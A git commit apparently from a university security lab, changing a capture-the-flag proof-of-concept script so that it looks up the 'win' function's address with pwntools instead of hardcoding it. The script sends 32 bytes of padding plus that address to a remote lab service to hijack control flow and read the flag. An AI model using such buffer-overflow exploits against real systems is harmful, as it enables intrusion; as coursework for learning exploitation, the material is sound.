e7f82a39e786e3db2b96a851e934397edcb1cc12
Tiago Santos <tiago.castro.santos@tecnico.ulisboa.pt>
2025-12-15 17:11:44 +0000

    modified solution 3 to use pwn tools

--- lab6/calling_functions_poc.py
+++ lab6/calling_functions_poc.py
@@ -5,8 +5,10 @@ PORT = 25153
 
 s = remote(SERVER, PORT, timeout=9999)
 
+elf = ELF('./functions') 
+address = elf.symbols['win']
 s.recv(512)
-s.sendline(b'1'*32 + p32(0x080486f1))
+s.sendline(b'1'*32 + p32(address))
 time.sleep(1)
 flag = s.recv(512).decode()
 print(flag)
